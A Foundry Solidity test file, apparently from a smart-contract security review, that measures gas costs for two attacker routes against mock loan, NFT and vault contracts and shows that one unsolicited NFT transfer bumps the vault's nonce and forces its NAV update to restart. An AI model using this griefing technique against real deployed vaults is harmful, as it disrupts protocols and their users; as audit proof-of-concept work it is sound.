// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.33;

import {Test, console} from "forge-std/Test.sol";
import {MiniVault, MiniLoans, MiniLoansNFT, MiniCalculator} from "../src/Harness.sol";

/// @notice Sanity-check the attacker-side gas numbers in isolation, with the
///         storage genuinely cold, before quoting them anywhere.
contract GasCheckTest is Test {
  MiniLoans internal l;
  MiniLoansNFT internal f;
  MiniCalculator internal c;
  MiniVault internal v;

  address internal civilian = address(0xC1F);
  address internal attacker = address(0xA77ACc);

  function setUp() public {
    l = new MiniLoans();
    f = new MiniLoansNFT(address(l));
    l.setLoansNFT(address(f));
    c = new MiniCalculator();
    v = new MiniVault(f, c, l, 4 hours, 1 hours);

    vm.prank(civilian);
    l.registerInvestor(civilian);
    vm.prank(attacker);
    l.registerInvestor(address(v));
  }

  /// @dev Uses vm.startPrank + a fresh transaction boundary so the measurement
  ///      is not distorted by warm slots left over from setup activity.
  function test_routeA_transferGas() public {
    vm.prank(civilian);
    uint64 id = l.create(civilian);

    // New transaction: cold-load everything the transfer will touch.
    vm.startPrank(civilian);
    vm.pauseGasMetering();
    vm.resumeGasMetering();

    uint256 g = gasleft();
    f.transferFrom(civilian, address(v), uint256(id));
    uint256 used = g - gasleft();
    vm.stopPrank();

    console.log("Route A transferFrom, measured gas:", used);
    assertEq(f.ownerOf(uint256(id)), address(v), "transfer must actually have happened");
    assertGt(f.ownershipNonce(address(v)), 0, "and must have bumped the vault nonce");
  }

  function test_routeB_createGas() public {
    vm.prank(attacker);
    uint256 g = gasleft();
    uint64 id = l.create(address(v));
    uint256 used = g - gasleft();

    console.log("Route B create, measured gas:", used);
    assertEq(f.ownerOf(uint256(id)), address(v), "mint must have landed in the vault");
  }

  /// @dev The number that actually matters: does the nonce move, and does the
  ///      next updateNav call therefore restart? Independent of gas.
  function test_theBumpIsWhatMatters() public {
    vm.prank(civilian);
    uint64 id = l.create(civilian);

    uint256 before = f.ownershipNonce(address(v));
    vm.prank(civilian);
    f.transferFrom(civilian, address(v), uint256(id));
    uint256 afterBump = f.ownershipNonce(address(v));

    console.log("vault ownershipNonce before:", before);
    console.log("vault ownershipNonce after :", afterBump);
    assertEq(afterBump, before + 1, "one unsolicited push == one forced restart");
  }
}
